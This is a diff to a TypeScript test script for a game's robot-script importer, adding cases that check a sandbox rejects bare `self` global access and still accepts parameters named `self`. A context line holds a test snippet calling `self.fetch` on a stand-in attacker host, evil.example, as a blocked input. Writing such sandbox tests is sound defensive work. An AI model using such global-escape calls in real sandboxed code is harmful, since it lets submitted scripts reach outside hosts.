@@ -269,6 +269,8 @@ async function main(): Promise<void> {
                     ['bare self assignment', 'const x = self;'],
                     ['bare self method call', "self.fetch('https://evil.example/x');"],
                     ['bare self property read', 'const x = self.foo;'],
+                    ['parenthesized bare self property read', 'const x = (self).foo;'],
+                    ['bare self passed as call argument', 'foo(self);'],
                 ];
                 for (const [label, snippet] of bareSelfCases) {
                     const bareResult = await importRobotFromText(snippet);
@@ -278,6 +280,50 @@ async function main(): Promise<void> {
                         bareResult.ok ? 'unexpected ok' : bareResult.error,
                     );
                 }
+
+                // Parameter declarations named `self` must still count as
+                // bindings, in both positions: arrow params and methods.
+                const arrowParam = [
+                    "export const meta = { id: 'testbot', name: 'TestBot', author: 'x', version: '1.0.0', description: 'x' };",
+                    'export const loadout = {};',
+                    'export function create() {',
+                    '  function update(sense) {',
+                    '    const first = (self, foe) => self.y + foe.y;',
+                    '    const second = (foe, self) => self.y + foe.y;',
+                    '    return { throttle: first(sense.self, sense.foes[0]) + second(sense.foes[0], sense.self) };',
+                    '  }',
+                    '  return { meta, loadout, update };',
+                    '}',
+                    '',
+                ].join('\n');
+                const arrowParamResult = await importRobotFromText(arrowParam);
+                check(
+                    'arrow params named self still import successfully',
+                    arrowParamResult.ok || (arrowParamResult.error !== IMPORT_ERROR.tooLarge && !arrowParamResult.error.startsWith('blocked API:')),
+                    arrowParamResult.ok ? '' : arrowParamResult.error,
+                );
+
+                const methodParam = [
+                    "export const meta = { id: 'testbot', name: 'TestBot', author: 'x', version: '1.0.0', description: 'x' };",
+                    'export const loadout = {};',
+                    'export function create() {',
+                    '  const api = {',
+                    '    readFirst(self) { return self.y; },',
+                    '    readSecond(foe, self) { return self.y + foe.y; },',
+                    '  };',
+                    '  function update(sense) {',
+                    '    return { throttle: api.readFirst(sense.self) + api.readSecond(sense.foes[0], sense.self) };',
+                    '  }',
+                    '  return { meta, loadout, update };',
+                    '}',
+                    '',
+                ].join('\n');
+                const methodParamResult = await importRobotFromText(methodParam);
+                check(
+                    'method params named self still import successfully',
+                    methodParamResult.ok || (methodParamResult.error !== IMPORT_ERROR.tooLarge && !methodParamResult.error.startsWith('blocked API:')),
+                    methodParamResult.ok ? '' : methodParamResult.error,
+                );
             }
 
             // The same tokens in comments/strings/template text must not
